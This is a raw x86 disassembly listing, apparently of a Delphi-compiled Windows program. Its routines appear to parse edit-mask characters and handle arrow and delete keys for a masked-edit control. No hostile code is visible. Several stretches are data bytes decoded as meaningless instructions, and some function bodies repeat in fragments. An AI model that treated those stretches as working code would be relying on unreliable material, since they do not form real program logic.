mov al 0xf7
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
clc
inc esi
add [ eax ] ch
clc
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx ] dl
clc
inc esi
add [ eax - 0x58000000 ] bh
out dx al
inc esi
add [ eax - 0x12 ] cl
inc ecx
add al al
xor eax [ eax ]
pushfd
out 0x41 eax
add al cl
xor eax [ eax ]
mov esp 0x4004033
xor [ eax ] eax
and [ ecx ] dh
inc eax
add [ ecx + esi * 8 ] dl
inc esi
add [ ebp + eax * 4 - 0x15afffbf ] cl
inc ecx
add [ eax - 0x53ffbe7c ] ch
0xe9f40046 0x41
sub_46f7c4
cmp bl ch
inc ecx
add [ eax ] dh
in al dx
inc ecx
add [ eax - 0x12 ] ah
inc ecx
add [ eax - 0x15 ] cl
inc ecx
add [ eax - 0x15 ] al
inc ecx
add [ eax - 0x12 ] ch
inc ecx
add [ eax + 0x600046f8 ] ah
inc esi
add [ eax - 0x37ffb99c ] bl
inc esi
add [ eax - 0x10 ] ah
inc esi
add [ eax - 0xf ] dh
inc esi
add [ ecx + esi * 8 - 0x6fbffba ] bl
inc esi
add ah ah
clc
inc esi
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax + edx + 0xac0040 ] dl
add [ eax ] al
adc [ ecx + ecx * 2 + 0x64 ] dl
dec ebp
popad
jo r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f09000b ] al
push eax
outsd
jb r-xdata
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0x4 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_46fa0a
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx [ ebp - 0x4 ]
mov edx esi
mov eax ebx
call sub_46f150
mov eax ebx
mov edx [ eax ]
call [ edx + 0x4c ]
xor ecx ecx
mov dl 0x1
mov eax [ r-xdata ]
call sub_46e9d8
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_46f9e8
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
add eax 0x74
mov edx [ ebx + 0xac ]
call sub_403f94
mov eax [ ebx + 0xa8 ]
mov edx [ ebp - 0x8 ]
mov [ edx + 0x78 ] eax
mov eax esi
mov edx [ eax ]
call [ edx ]
mov edx eax
lea eax [ ebp - 0x10 ]
call sub_40458c
mov eax esi
mov edx [ eax ]
call [ edx ]
mov ecx eax
lea edx [ ebp - 0x10 ]
mov eax esi
mov esi [ eax ]
call [ esi + 0xc ]
mov edx [ ebp - 0x10 ]
mov eax [ ebp - 0x8 ]
call sub_46f6d8
lea ecx [ ebp - 0xc ]
or edx 0xffffffff
mov eax [ ebp - 0x8 ]
call sub_46eb90
cmp [ ebp - 0xc ] 0x0
je r-xdata
jae r-xdata
outsb
push edx
jno r-xdata
add [ ecx ] cl
dec edi
push ebp
inc esp
push eax
nop
sub al bh
inc esi
add [ edi ] al
adc [ ecx + ecx * 2 + 0x64 ] dl
dec ebp
popad
jo r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46f9ef
mov dl 0x1
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx - 0x4 ]
retn
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x20 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x18 ]
mov eax ebx
call sub_46ebe8
nop
push ebx
push esi
test dl dl
je r-xdata
push eax
outsd
jb r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_46f0c8
add esp 0xfffffff0
call sub_403490
cmp edi ecx
dec [ ebx + 0x33f08bda ]
ror [ ebx - 0x7f2173a ] cl
push ebp
inc esp
push eax
mov al 0xf7
inc esi
add [ eax - 0x11 ] bl
inc esi
add [ eax + eax ] cl
cmovns esp [ ebp + ecx * 2 + 0x61 ]
jo r-xdata
mov eax esi
pop esi
pop ebx
retn
call sub_4034e8
pop [ fs : 0x0 ]
add esp 0xc
mov edx 0x35
mov eax esi
call sub_46f284
mov eax esi
test bl bl
je r-xdata
push eax
outsd
jb r-xdata
push ebp
inc esp
push eax
add al [ eax ]
xchg esp eax
adc [ eax ] al
lodsb [ esi ]
add [ eax ] al
[ eax + eax + 0x1ff00 ]
sub_46f864
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
or al [ eax ]
or cl [ ebp + 0x61 ]
jo r-xdata
cmp [ eax + 0xb2 ] 0x0
je r-xdata
dec eax
outsd
jae r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0xb4 ]
call [ ebx + 0xb0 ]
mov esp 0xb0004152
add [ eax ] al
push [ eax + 0x1ff0000 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f09000b ] al
outsb
push edx
jno r-xdata
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0x4 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_46fa0a
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx [ ebp - 0x4 ]
mov edx esi
mov eax ebx
call sub_46f150
mov eax ebx
mov edx [ eax ]
call [ edx + 0x4c ]
xor ecx ecx
mov dl 0x1
mov eax [ r-xdata ]
call sub_46e9d8
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_46f9e8
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
add eax 0x74
mov edx [ ebx + 0xac ]
call sub_403f94
mov eax [ ebx + 0xa8 ]
mov edx [ ebp - 0x8 ]
mov [ edx + 0x78 ] eax
mov eax esi
mov edx [ eax ]
call [ edx ]
mov edx eax
lea eax [ ebp - 0x10 ]
call sub_40458c
mov eax esi
mov edx [ eax ]
call [ edx ]
mov ecx eax
lea edx [ ebp - 0x10 ]
mov eax esi
mov esi [ eax ]
call [ esi + 0xc ]
mov edx [ ebp - 0x10 ]
mov eax [ ebp - 0x8 ]
call sub_46f6d8
lea ecx [ ebp - 0xc ]
or edx 0xffffffff
mov eax [ ebp - 0x8 ]
call sub_46eb90
cmp [ ebp - 0xc ] 0x0
je r-xdata
jae r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46f9ef
mov dl 0x1
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx - 0x4 ]
retn
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x20 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x18 ]
mov eax ebx
call sub_46ebe8
nop
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_46f0c8
mov edx 0x35
mov eax esi
call sub_46f284
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403490
mov eax esi
pop esi
pop ebx
retn
call sub_4034e8
pop [ fs : 0x0 ]
add esp 0xc
sub_46f904
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
xor ebx ebx
mov [ ebp - 0xc ] ebx
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0x4 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_46fa0a
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx [ ebp - 0x4 ]
mov edx esi
mov eax ebx
call sub_46f150
mov eax ebx
mov edx [ eax ]
call [ edx + 0x4c ]
xor ecx ecx
mov dl 0x1
mov eax [ r-xdata ]
call sub_46e9d8
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_46f9e8
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
add eax 0x74
mov edx [ ebx + 0xac ]
call sub_403f94
mov eax [ ebx + 0xa8 ]
mov edx [ ebp - 0x8 ]
mov [ edx + 0x78 ] eax
mov eax esi
mov edx [ eax ]
call [ edx ]
mov edx eax
lea eax [ ebp - 0x10 ]
call sub_40458c
mov eax esi
mov edx [ eax ]
call [ edx ]
mov ecx eax
lea edx [ ebp - 0x10 ]
mov eax esi
mov esi [ eax ]
call [ esi + 0xc ]
mov edx [ ebp - 0x10 ]
mov eax [ ebp - 0x8 ]
call sub_46f6d8
lea ecx [ ebp - 0xc ]
or edx 0xffffffff
mov eax [ ebp - 0x8 ]
call sub_46eb90
cmp [ ebp - 0xc ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46f9ef
mov dl 0x1
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx - 0x4 ]
retn
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x20 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x18 ]
mov eax ebx
call sub_46ebe8
sub_46fa18
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_46fa3d
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46fa44
retn
sub_46fa60
push ebx
push esi
push edi
push ecx
mov edi edx
mov esi eax
mov bl 0x1
mov [ esp ] 0x0
mov eax esi
call sub_404200
cmp edi eax
jg r-xdata
mov eax esi
call sub_404200
cmp edi eax
jle r-xdata
mov al [ esi + edi - 0x1 ]
mov [ esp ] al
mov edx edi
mov eax esi
call sub_40c380
test al al
je r-xdata
xor ebx ebx
jmp r-xdata
cmp edi 0x1
jle r-xdata
mov bl 0x1
jmp r-xdata
mov eax ebx
pop edx
pop edi
pop esi
pop ebx
retn
mov al [ esp ]
cmp al [ rw-data ]
jne r-xdata
cmp [ esi + edi - 0x2 ] 0x5c
jne r-xdata
mov eax esi
call sub_404200
cmp eax 0x4
jl r-xdata
mov eax esi
call sub_404200
cmp eax 0x4
jl r-xdata
mov edx edi
dec edx
mov eax esi
call sub_40c380
test al al
jne r-xdata
mov al [ esp ]
sub al 0x2f
je r-xdata
mov eax esi
call sub_404200
sub eax 0x4
cmp edi eax
jle r-xdata
mov eax esi
call sub_404200
sub eax 0x4
cmp edi eax
jle r-xdata
cmp edi 0x2
jle r-xdata
mov bl 0x2
jmp r-xdata
sub al 0xb
jne r-xdata
mov al [ esi + edi - 0x2 ]
cmp al [ rw-data ]
jne r-xdata
mov bl 0x6
jmp r-xdata
mov bl 0x1
jmp r-xdata
cmp [ esi + edi - 0x3 ] 0x5c
jne r-xdata
mov al [ esp ]
sub al 0x21
je r-xdata
cmp edi 0x2
jle r-xdata
mov edx edi
sub edx 0x2
mov eax esi
call sub_40c380
test al al
je r-xdata
mov bl 0x3
jmp r-xdata
sub al 0x1b
je r-xdata
mov bl 0x7
jmp r-xdata
cmp [ esi + edi - 0x3 ] 0x5c
jne r-xdata
sub al 0x2
je r-xdata
mov edx edi
sub edx 0x2
mov eax esi
call sub_40c380
cmp al 0x2
jne r-xdata
sub al 0x1e
jne r-xdata
mov al [ esp ]
sub al 0x23
je r-xdata
mov bl 0x5
jmp r-xdata
sub al 0x16
je r-xdata
sub al 0x28
je r-xdata
sub al 0x2
je r-xdata
sub al 0x9
jne r-xdata
mov al [ esp ]
sub al 0x30
je r-xdata
mov bl 0x4
sub al 0x11
je r-xdata
sub al 0x2
je r-xdata
sub al 0x9
jne r-xdata
sub_46fbb4
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] edx
mov edi eax
mov bl [ r-xdata ]
mov eax edi
call sub_404200
mov esi eax
test esi esi
jle r-xdata
mov edx [ esp ]
mov eax edi
call sub_46fa60
cmp al 0x1
jne r-xdata
mov ebp 0x1
mov eax ebx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
or bl 0x8
cmp al 0x3e
jne r-xdata
or bl 0x1
jmp r-xdata
cmp al 0x3c
jne r-xdata
cmp ebp [ esp ]
jge r-xdata
inc ebp
dec esi
jne r-xdata
cmp ebp [ esp ]
jge r-xdata
and bl 0xfb
cmp ebp 0x1
jle r-xdata
mov al [ edi + ebp - 0x1 ]
cmp al 0x21
jne r-xdata
and bl 0xfd
or bl 0x4
or bl 0x2
jmp r-xdata
cmp [ edi + ebp - 0x2 ] 0x3c
je r-xdata
sub_46fc30
mov edx eax
sub al 0x2f
je r-xdata
mov edx [ rw-data ]
mov dl [ edx ]
sub al 0xb
jne r-xdata
mov eax edx
retn
mov edx [ rw-data ]
mov dl [ edx ]
mov eax edx
retn
sub_46fc50
push ebp
mov ebp esp
push ecx
mov ecx 0x6
push 0x0
push 0x0
dec ecx
jne r-xdata
push ecx
xchg [ ebp - 0x4 ] ecx
push ebx
push esi
mov [ ebp - 0x5 ] cl
mov esi edx
mov [ ebp - 0x4 ] eax
mov ebx [ ebp + 0x8 ]
xor eax eax
push ebp
push sub_46fe5a
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
mov edx esi
call sub_403f94
mov edx 0x1
mov eax [ ebp - 0x4 ]
call sub_46fbb4
mov [ ebp - 0x11 ] al
test [ ebp - 0x11 ] 0x1
jne r-xdata
mov eax [ ebx ]
call sub_404200
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x4 ]
call sub_404200
dec eax
test eax eax
jl r-xdata
mov [ ebp - 0x10 ] 0x1
mov eax [ ebp - 0x4 ]
call sub_404200
test eax eax
jle r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46fe61
lea eax [ ebp - 0x38 ]
mov edx 0x8
call sub_403f64
retn
inc eax
mov [ ebp - 0x18 ] eax
mov [ ebp - 0xc ] 0x0
mov [ ebp - 0x18 ] eax
mov esi 0x1
add al 0xfc
sub al 0x2
jae r-xdata
lea eax [ ebp - 0x2c ]
push eax
mov eax [ ebx ]
mov ecx [ ebp - 0x10 ]
mov edx 0x1
call sub_404460
push [ ebp - 0x2c ]
mov eax [ ebp - 0x4 ]
mov al [ eax + esi - 0x1 ]
call sub_46fc30
mov edx eax
lea eax [ ebp - 0x30 ]
call sub_404128
push [ ebp - 0x30 ]
lea eax [ ebp - 0x34 ]
push eax
mov eax [ ebx ]
call sub_404200
mov ecx eax
sub ecx [ ebp - 0x10 ]
mov edx [ ebp - 0x10 ]
inc edx
mov eax [ ebx ]
call sub_404460
push [ ebp - 0x34 ]
mov eax ebx
mov edx 0x3
call sub_4042c0
jmp r-xdata
add al 0xfc
sub al 0x2
jae r-xdata
lea eax [ ebp - 0x1c ]
push eax
mov ecx [ ebp - 0x10 ]
dec ecx
mov eax [ ebx ]
mov edx 0x1
call sub_404460
push [ ebp - 0x1c ]
mov eax [ ebp - 0x4 ]
mov al [ eax + esi - 0x1 ]
call sub_46fc30
mov edx eax
lea eax [ ebp - 0x20 ]
call sub_404128
push [ ebp - 0x20 ]
lea eax [ ebp - 0x24 ]
push eax
mov eax [ ebx ]
call sub_404200
mov ecx eax
sub ecx [ ebp - 0x10 ]
inc ecx
mov eax [ ebx ]
mov edx [ ebp - 0x10 ]
call sub_404460
push [ ebp - 0x24 ]
mov eax ebx
mov edx 0x3
call sub_4042c0
inc [ ebp - 0x10 ]
jmp r-xdata
inc [ ebp - 0xc ]
dec [ ebp - 0x18 ]
jne r-xdata
cmp [ ebp - 0x10 ] 0x1
jge r-xdata
inc esi
dec [ ebp - 0x18 ]
jne r-xdata
mov eax [ ebx ]
call sub_404200
cmp eax [ ebp - 0x10 ]
jge r-xdata
mov eax [ ebp - 0x4 ]
call sub_404200
mov esi eax
sub esi [ ebp - 0xc ]
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_46fa60
mov edx eax
dec edx
sub dl 0x2
jae r-xdata
dec [ ebp - 0x10 ]
lea eax [ ebp - 0x38 ]
mov dl [ ebp - 0x5 ]
call sub_404128
mov edx [ ebp - 0x38 ]
mov ecx [ ebx ]
mov eax ebx
call sub_40424c
jmp r-xdata
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_46fa60
mov edx eax
dec edx
sub dl 0x2
jae r-xdata
jmp r-xdata
inc [ ebp - 0x10 ]
lea eax [ ebp - 0x28 ]
mov dl [ ebp - 0x5 ]
call sub_404128
mov edx [ ebp - 0x28 ]
mov eax ebx
call sub_404208
sub_46fe6c
push ebx
push esi
push edi
push ebp
push ecx
mov esi eax
mov [ esp ] 0x1
mov eax esi
call sub_404200
cmp eax 0x4
jl r-xdata
mov al [ esp ]
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
or ebp 0xffffffff
or edi 0xffffffff
mov eax esi
call sub_404200
mov ebx eax
dec ebx
test ebx ebx
jle r-xdata
test ebp ebp
jge r-xdata
test edi edi
jge r-xdata
mov eax esi
call sub_404200
sub eax 0x4
cmp ebx eax
jl r-xdata
mov edi ebx
mov ebp ebx
jmp r-xdata
test edi edi
jle r-xdata
mov edi ebp
test edi edi
jl r-xdata
mov eax esi
call sub_404200
cmp edi eax
je r-xdata
mov edx ebx
mov eax esi
call sub_46fa60
cmp al 0x6
jne r-xdata
mov al [ esi + edi ]
cmp al [ rw-data ]
sete al
xor al 0x1
mov [ esp ] al
sub_46fef0
push ebx
push esi
mov esi eax
mov bl [ rw-data ]
mov eax esi
call sub_404200
cmp eax 0x4
jl r-xdata
mov eax ebx
pop esi
pop ebx
retn
mov eax esi
call sub_404200
mov edx eax
dec edx
mov eax esi
call sub_46fa60
cmp al 0x6
jne r-xdata
mov eax esi
call sub_404200
mov edx eax
sub edx 0x2
mov eax esi
call sub_46fa60
cmp al 0x6
je r-xdata
mov eax esi
call sub_404200
mov bl [ esi + eax - 0x1 ]
mov eax esi
call sub_404200
mov edx eax
sub edx 0x3
mov eax esi
call sub_46fa60
cmp al 0x6
jne r-xdata
sub_46ff5c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x8 ] ebx
mov [ ebp - 0x4 ] ecx
mov ebx edx
mov edi eax
xor eax eax
push ebp
push sub_46ffd9
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_403f40
mov esi ebx
test esi esi
jle r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46ffe0
lea eax [ ebp - 0x8 ]
call sub_403f40
retn
mov ebx 0x1
inc ebx
dec esi
jne r-xdata
add al 0xfd
sub al 0x2
jb r-xdata
mov edx ebx
mov eax edi
call sub_46fa60
sub al 0x3
je r-xdata
lea eax [ ebp - 0x8 ]
mov dl [ edi + ebx - 0x1 ]
call sub_404128
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_404208
mov eax [ ebp - 0x4 ]
sub_46ffe8
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_47002d
push [ fs : eax ]
mov [ fs : eax ] esp
lea ecx [ ebp - 0x4 ]
mov edx esi
mov eax ebx
call sub_46ff5c
mov eax [ ebp - 0x4 ]
call sub_404200
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_470034
lea eax [ ebp - 0x4 ]
call sub_403f40
retn
sub_47003c
push ebx
push esi
push edi
push ebp
push ecx
mov ebx edx
mov edi eax
mov eax edi
call sub_404200
mov edx eax
mov eax edi
call sub_46ffe8
cmp eax ebx
jge r-xdata
xor ebp ebp
mov [ esp ] ebx
mov eax edi
call sub_404200
mov ebx eax
test ebx ebx
jle r-xdata
or ebp 0xffffffff
jmp r-xdata
mov eax ebp
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov esi 0x1
inc esi
dec ebx
jne r-xdata
dec [ esp ]
cmp [ esp ] 0x0
jl r-xdata
inc ebp
mov edx esi
mov eax edi
call sub_46fa60
cmp al 0x3
je r-xdata
sub_470098
push ebx
push esi
mov esi eax
xor ebx ebx
mov eax esi
call sub_47003c
test eax eax
jl r-xdata
mov eax ebx
pop esi
pop ebx
retn
mov edx eax
mov eax esi
call sub_46fa60
dec eax
sub al 0x2
setb bl
sub_4700c0
push ebp
mov ebp esp
push ecx
mov ecx 0x4
push 0x0
push 0x0
dec ecx
jne r-xdata
push ecx
xchg [ ebp - 0x4 ] ecx
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov edi edx
mov [ ebp - 0x4 ] eax
mov ebx [ ebp + 0x8 ]
mov esi [ ebp + 0x14 ]
xor eax eax
push ebp
push sub_470245
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
sub eax [ ebp - 0x8 ]
cmp eax [ ebp + 0x10 ]
jge r-xdata
mov eax esi
sub eax [ ebp - 0x8 ]
cmp eax [ ebp + 0x10 ]
jle r-xdata
mov edx 0x1
mov eax [ ebp - 0x4 ]
call sub_46fbb4
mov [ ebp - 0x9 ] al
mov eax esi
dec eax
mov [ ebp - 0x10 ] eax
test [ ebp - 0x9 ] 0x1
je r-xdata
mov eax ebx
mov edx edi
call sub_403f94
mov edx 0x1
mov eax [ ebp - 0x4 ]
call sub_46fbb4
mov [ ebp - 0x9 ] al
test [ ebp - 0x9 ] 0x1
je r-xdata
push ebx
mov ecx [ ebp - 0x10 ]
mov edx 0x1
mov eax edi
call sub_404460
sub esi [ ebp - 0x8 ]
mov eax [ ebp + 0x10 ]
sub eax esi
test eax eax
jle r-xdata
mov eax [ ebp - 0x8 ]
dec eax
mov [ ebp - 0x10 ] eax
lea eax [ ebp - 0x24 ]
push eax
mov eax edi
call sub_404200
mov ecx eax
mov edx esi
mov eax edi
call sub_404460
mov eax [ ebp - 0x24 ]
push eax
lea eax [ ebp - 0x28 ]
push eax
mov ecx [ ebp - 0x8 ]
add ecx [ ebp + 0x10 ]
dec ecx
mov edx 0x1
mov eax edi
call sub_404460
mov edx [ ebp - 0x28 ]
mov eax ebx
pop ecx
call sub_40424c
jmp r-xdata
lea eax [ ebp - 0x1c ]
push eax
mov eax edi
call sub_404200
mov ecx eax
mov edx esi
sub edx [ ebp + 0x10 ]
mov eax edi
call sub_404460
mov eax [ ebp - 0x1c ]
push eax
lea eax [ ebp - 0x20 ]
push eax
mov ecx [ ebp - 0x8 ]
dec ecx
mov edx 0x1
mov eax edi
call sub_404460
mov edx [ ebp - 0x20 ]
mov eax ebx
pop ecx
call sub_40424c
jmp r-xdata
lea eax [ ebp - 0x18 ]
push eax
mov eax edi
call sub_404200
mov ecx eax
mov edx [ ebp - 0x10 ]
inc edx
mov eax edi
call sub_404460
mov edx [ ebp - 0x18 ]
mov eax ebx
call sub_404208
jmp r-xdata
mov esi eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47024c
lea eax [ ebp - 0x28 ]
mov edx 0x6
call sub_403f64
retn
lea eax [ ebp - 0x14 ]
mov dl [ ebp + 0xc ]
call sub_404128
mov edx [ ebp - 0x14 ]
mov eax ebx
call sub_404208
dec esi
jne r-xdata
sub_470258
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x28 ] ebx
mov [ ebp - 0x24 ] ebx
mov [ ebp - 0x20 ] ebx
mov [ ebp - 0x1 ] cl
mov edi edx
mov esi eax
mov ebx [ ebp + 0x8 ]
xor eax eax
push ebp
push sub_47041e
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
mov [ ebp - 0x8 ] eax
mov eax ebx
mov edx edi
call sub_403f94
mov eax esi
call sub_404200
test eax eax
jle r-xdata
mov eax esi
call sub_404200
mov edx eax
mov eax esi
call sub_46ffe8
mov edi eax
mov eax [ ebx ]
call sub_404200
cmp edi eax
je r-xdata
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x14 ] 0x1
mov eax [ ebx ]
call sub_404200
test eax eax
jle r-xdata
mov eax [ ebx ]
call sub_404200
inc eax
push eax
sub edi [ ebp - 0x8 ]
push edi
mov al [ ebp - 0x1 ]
push eax
lea eax [ ebp - 0x28 ]
push eax
mov ecx [ ebp - 0x8 ]
inc ecx
mov edx [ ebx ]
mov eax esi
call sub_4700c0
mov edx [ ebp - 0x28 ]
mov eax ebx
call sub_403f94
inc [ ebp - 0x14 ]
dec [ ebp - 0x18 ]
jne r-xdata
mov edx [ ebp - 0x14 ]
mov eax esi
call sub_46ffe8
mov [ ebp - 0x10 ] eax
mov eax [ ebx ]
call sub_404200
inc eax
mov [ ebp - 0xc ] eax
mov edi [ ebp - 0x8 ]
inc edi
mov eax [ ebx ]
call sub_404200
sub eax edi
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_470425
lea eax [ ebp - 0x28 ]
mov edx 0x3
call sub_403f64
retn
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x10 ] 0x1
mov edx [ ebp - 0x14 ]
mov eax esi
call sub_46fa60
dec eax
sub al 0x2
jae r-xdata
mov eax [ ebx ]
call sub_404200
cmp eax [ ebp - 0xc ]
jge r-xdata
inc eax
mov [ ebp - 0x1c ] eax
inc [ ebp - 0x10 ]
dec [ ebp - 0x18 ]
jne r-xdata
mov edx [ ebp - 0x10 ]
dec edx
mov eax esi
call sub_470098
test al al
jne r-xdata
mov eax [ ebp - 0xc ]
push eax
mov edi [ ebp - 0x8 ]
inc edi
mov eax [ ebp - 0x10 ]
sub eax edi
push eax
mov al [ ebp - 0x1 ]
push eax
lea eax [ ebp - 0x24 ]
push eax
mov ecx edi
mov edx [ ebx ]
mov eax esi
call sub_4700c0
mov edx [ ebp - 0x24 ]
mov eax ebx
call sub_403f94
mov eax [ ebp - 0x10 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x14 ]
mov al [ esi + eax - 0x1 ]
call sub_46fc30
mov edx eax
lea eax [ ebp - 0x20 ]
call sub_404128
mov edx [ ebp - 0x20 ]
mov eax ebx
call sub_404208
inc edi
dec [ ebp - 0x1c ]
jne r-xdata
mov [ ebp - 0xc ] edi
jmp r-xdata
mov eax [ ebx ]
mov edx [ ebp - 0x10 ]
cmp [ eax + edx - 0x1 ] 0x20
jne r-xdata
mov eax ebx
call j_sub_40440c
mov edx [ ebp - 0x10 ]
mov cl [ ebp - 0x1 ]
mov [ eax + edx - 0x1 ] cl
mov eax [ ebp - 0x14 ]
mov al [ esi + eax - 0x1 ]
call sub_46fc30
mov edx [ ebx ]
cmp al [ edx + edi - 0x1 ]
jne r-xdata
sub_470430
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_470455
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47045c
retn
sub_4706a8
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_436000
mov al [ r-xdata ]
mov [ esi + 0x22d ] al
mov eax [ rw-data ]
mov al [ eax ]
mov [ esi + 0x224 ] al
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403490
mov eax esi
pop esi
pop ebx
retn
call sub_4034e8
pop [ fs : 0x0 ]
add esp 0xc
sub_4706fc
push ebx
push esi
push ecx
mov [ esp ] cl
mov esi edx
mov ebx eax
cmp [ ebx + 0x23c ] 0x0
jne r-xdata
mov eax ebx
call sub_470c84
test al al
je r-xdata
mov edx esi
mov cl [ esp ]
mov eax ebx
call sub_44527c
pop edx
pop esi
pop ebx
retn
cmp [ esi ] 0x0
je r-xdata
test [ esp ] 0x2
jne r-xdata
cmp [ esi ] 0x25
je r-xdata
mov dx [ esi ]
mov cl [ esp ]
mov eax ebx
call sub_471360
test [ esp ] 0x1
jne r-xdata
cmp [ esi ] 0x27
jne r-xdata
test [ esp ] 0x4
jne r-xdata
cmp [ esi ] 0x26
je r-xdata
mov [ esi ] 0x0
jmp r-xdata
mov [ esi ] 0x0
jmp r-xdata
cmp [ esi ] 0x28
jne r-xdata
cmp [ esi ] 0x24
je r-xdata
mov dx [ esi ]
mov cl [ esp ]
mov eax ebx
call sub_4715f8
mov [ esi ] 0x0
jmp r-xdata
cmp [ esi ] 0x23
jne r-xdata
cmp [ esi ] 0x2e
jne r-xdata
cmp [ esi ] 0x8
jne r-xdata
test [ esp ] 0x1
je r-xdata
mov eax ebx
call sub_471114
mov eax ebx
mov edx [ eax ]
call [ edx + 0xe8 ]
test al al
je r-xdata
mov [ esi ] 0x0
jmp r-xdata
mov dx [ esi ]
mov eax ebx
call sub_4716c8
sub_4707dc
push ebx
push esi
push ecx
mov [ esp ] cl
mov esi edx
mov ebx eax
cmp [ ebx + 0x23c ] 0x0
jne r-xdata
mov eax ebx
call sub_470c84
test al al
je r-xdata
mov edx esi
mov cl [ esp ]
mov eax ebx
call sub_445364
pop edx
pop esi
pop ebx
retn
cmp [ esi ] 0x0
je r-xdata
cmp [ esi ] 0x25
je r-xdata
test [ esp ] 0x4
je r-xdata
cmp [ esi ] 0x27
jne r-xdata
mov eax ebx
call sub_471114
sub_47082c
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax esi
call sub_445434
mov eax esi
call sub_470c84
test al al
je r-xdata
pop esi
pop ebx
retn
cmp [ ebx ] 0x0
je r-xdata
mov al [ ebx ]
sub al 0x3
je r-xdata
sub al 0x13
je r-xdata
sub al 0x2
je r-xdata
mov edx ebx
mov eax esi
call sub_471188
mov [ ebx ] 0x0
sub_470884
push ebx
push esi
add esp 0xfffffff8
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_44157c
mov eax ebx
call sub_470c84
test al al
je r-xdata
pop ecx
pop edx
pop esi
pop ebx
retn
lea ecx [ esp + 0x4 ]
mov edx esp
